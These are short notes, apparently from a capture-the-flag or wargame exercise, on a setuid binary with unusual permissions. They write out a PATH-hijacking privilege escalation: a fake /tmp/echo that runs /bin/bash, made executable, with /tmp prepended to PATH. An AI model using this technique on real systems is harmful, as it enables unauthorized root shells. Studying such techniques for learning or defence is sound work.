https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code

https://askubuntu.com/questions/857066/meaning-of-the-access-permissions-rws-and-root-root-of-usr-bin-sudo

File has a weird CHMOD.

Security threat, can replace env variable

`echo "/bin/bash" > /tmp/echo`

`chmod 777 /tmp/echo && export PATH=/tmp:$PATH`

Do command `env` and see path went from:

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

to 

PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
